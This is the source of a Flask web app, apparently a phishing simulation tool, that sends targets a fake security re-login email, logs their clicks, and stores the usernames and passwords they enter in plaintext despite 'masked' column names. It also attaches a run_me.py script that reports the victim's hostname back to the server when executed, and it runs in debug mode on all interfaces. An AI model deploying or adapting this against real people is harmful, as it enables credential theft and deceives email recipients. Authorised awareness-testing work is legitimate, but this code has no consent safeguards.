# app.py
from flask import Flask, render_template, request, redirect, url_for, flash
from email.message import EmailMessage
import smtplib
import hashlib
import os
from datetime import datetime
import sqlite3
from pathlib import Path

app = Flask(__name__)
app.secret_key = os.urandom(16)

# === CONFIG SMTP GMAIL ===
GMAIL_USER = "addresse-mail@gmail.com"  # remplacer par votre adresse Gmail
GMAIL_APP_PASSWORD = "mot-de-passe"  # mot de passe d'application

# SQLite DB
DB_PATH = Path("phish_sim.db")

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("""CREATE TABLE IF NOT EXISTS targets (
                    id INTEGER PRIMARY KEY,
                    hash TEXT UNIQUE,
                    firstname TEXT,
                    lastname TEXT,
                    email TEXT,
                    ts_created TEXT
                   )""")
    cur.execute("""CREATE TABLE IF NOT EXISTS clicks (
                    id INTEGER PRIMARY KEY,
                    target_hash TEXT,
                    ts TEXT
                   )""")
    cur.execute("""CREATE TABLE IF NOT EXISTS submissions (
                    id INTEGER PRIMARY KEY,
                    target_hash TEXT,
                    username_masked TEXT,
                    password_masked TEXT,
                    ts TEXT
                   )""")
    cur.execute("""CREATE TABLE IF NOT EXISTS executions (
                id INTEGER PRIMARY KEY,
                target_hash TEXT,
                ts TEXT
              )""")
    conn.commit()
    conn.close()

init_db()

def make_hash(firstname: str, lastname: str) -> str:
    s = (firstname.strip() + " " + lastname.strip()).lower()
    return hashlib.sha256(s.encode("utf-8")).hexdigest()[:16]  

@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")

@app.route("/executed/<user_hash>", methods=["GET"])
def executed(user_hash):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO executions (target_hash, ts) VALUES (?, datetime('now'))",
        (user_hash,)
    )
    conn.commit()
    conn.close()
    return "Execution enregistrée"

@app.route("/send", methods=["POST"])
def send():
    firstname = request.form.get("firstname", "").strip()
    lastname = request.form.get("lastname", "").strip()
    target_email = request.form.get("email", "").strip()

    if not firstname or not lastname or not target_email:
        flash("Tous les champs sont requis.", "danger")
        return redirect(url_for("index"))

    user_hash = make_hash(firstname, lastname)
    landing_url = url_for("landing", user_hash=user_hash, _external=True)
    executed_url = url_for("executed", user_hash=user_hash, _external=True)

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        "INSERT OR IGNORE INTO targets (hash, firstname, lastname, email, ts_created) VALUES (?, ?, ?, ?, datetime('now'))",
        (user_hash, firstname, lastname, target_email)
    )
    conn.commit()
    conn.close()


    # === Contenu du mail ===
    msg = EmailMessage()
    msg["From"] = GMAIL_USER
    msg["To"] = target_email
    msg["Subject"] = "Action requise : reconnectez-vous pour raisons de sécurité"
    msg.set_content(
        f"Bonjour {firstname} {lastname},\n\n"
        "Pour des raisons de sécurité, merci de vous reconnecter à votre compte en suivant ce lien :\n\n"
        f"{landing_url}\n\n"
    )

    # === SCRIPT.py ===
    file_content = f"""
import urllib.parse
import urllib.request
import socket

USER_HASH = "{user_hash}"
SERVER_URL = "{executed_url}"

hostname = socket.gethostname()
params = {{"host": hostname}}
url = SERVER_URL + "?" + urllib.parse.urlencode(params)

try:
    with urllib.request.urlopen(url, timeout=10):
        pass
except:
    pass
"""
    msg.add_attachment(file_content.encode("utf-8"),
                       maintype="text",
                       subtype="x-python",
                       filename="run_me.py")

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(GMAIL_USER, GMAIL_APP_PASSWORD)
            smtp.send_message(msg)
    except Exception as e:
        flash(f"Erreur d'envoi via Gmail : {e}", "danger")
        return redirect(url_for("index"))

    flash(f"E-mail envoyé vers {target_email} via Gmail (hash={user_hash})", "success")
    return redirect(url_for("index"))

@app.route("/landing/<user_hash>", methods=["GET"])
def landing(user_hash):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("INSERT INTO clicks (target_hash, ts) VALUES (?, datetime('now'))", (user_hash,))
    conn.commit()
    conn.close()
    return render_template("landing.html", user_hash=user_hash)

@app.route("/submit/<user_hash>", methods=["POST"])
def submit(user_hash):
    entered_user = request.form.get("username", "")
    entered_pass = request.form.get("password", "")
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO submissions (target_hash, username_masked, password_masked, ts) VALUES (?, ?, ?, datetime('now'))",
        (user_hash, entered_user, entered_pass)
    )
    conn.commit()
    conn.close()
    return render_template("result.html", user_hash=user_hash, username_masked=entered_user, password_masked=entered_pass)

@app.route("/admin/clear", methods=["POST"])
def clear_data():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("DELETE FROM targets")
    cur.execute("DELETE FROM clicks")
    cur.execute("DELETE FROM submissions")
    cur.execute("DELETE FROM executions")
    conn.commit()
    conn.close()
    flash("Toutes les données ont été supprimées.", "success")
    return redirect(url_for("admin"))

@app.route("/admin", methods=["GET"])
def admin():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT hash, firstname, lastname, email, ts_created FROM targets")
    targets = cur.fetchall()
    cur.execute("""
        SELECT c.target_hash AS hash, t.firstname, t.lastname, c.ts
        FROM clicks c
        LEFT JOIN targets t ON t.hash = c.target_hash
        ORDER BY c.ts DESC
    """)
    clicks = cur.fetchall()
    cur.execute("""
        SELECT s.target_hash AS hash,
               t.firstname,
               t.lastname,
               s.username_masked,
               s.password_masked,
               s.ts AS submit_ts
        FROM submissions s
        LEFT JOIN targets t ON t.hash = s.target_hash
        ORDER BY s.ts DESC
    """)
    submissions = cur.fetchall()
    cur.execute("""
        SELECT e.target_hash AS hash, t.firstname, t.lastname, e.ts
        FROM executions e
        LEFT JOIN targets t ON t.hash = e.target_hash
        ORDER BY e.ts DESC
    """)
    executions = cur.fetchall()
    conn.close()
    return render_template(
        "admin.html",
        targets=targets,
        clicks=clicks,
        submissions=submissions,
        executions=executions
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
